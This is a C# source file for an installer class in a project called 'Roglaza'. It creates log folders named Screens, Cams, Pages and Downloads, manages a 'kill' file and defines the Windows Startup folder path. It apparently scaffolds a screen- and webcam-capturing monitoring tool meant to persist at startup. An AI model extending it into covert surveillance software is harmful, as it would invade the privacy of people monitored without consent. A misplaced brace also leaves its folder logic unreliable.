using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Roglaza
{

    class RoglazaInstaller
    {
        public static List<string> RoglazaDirectories = new List<string>() { "Downloads","Pages","Screens","Cams"};

        internal static void InstallDirectories(string CurrentDirectory)
        {
            CurrentDirectory += "\\Logs";

            string ApDataPath = RoglazaHelper.GetRoglazaAPPDataPath();
            RoglazaInstaller.CreatIfNotExisted(ApDataPath);

            if (RoglazaHelper.IsExistedDirectory(CurrentDirectory))
                RoglazaInstaller.CreatIfNotExisted(CurrentDirectory);
            {
              
                foreach (string dir in RoglazaInstaller.RoglazaDirectories)
                    RoglazaInstaller.CreatIfNotExisted(CurrentDirectory + "\\" + dir);

            }
            
        }

        private static void CreatIfNotExisted(string p)
        {
            if (!RoglazaHelper.IsExistedDirectory(p))
                RoglazaHelper.createDirectory(p);
        }

        internal static bool SetKillFile(bool killme)
        {
            string file = RoglazaHelper.getKillFilePath();

            if (killme)
            {
                return RoglazaHelper.createEmptyFile(file);
            }
            else
            {
              return   RoglazaHelper.DeleteFile(file);
            }
        }

        internal static bool IsAdminUnistalledMe()
        {
          return  RoglazaHelper.IsExistedFile(RoglazaHelper.GetRoglazaAPPDataPath() + "//kill");
        }
        public static string StartupPath=@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup";
    }
}
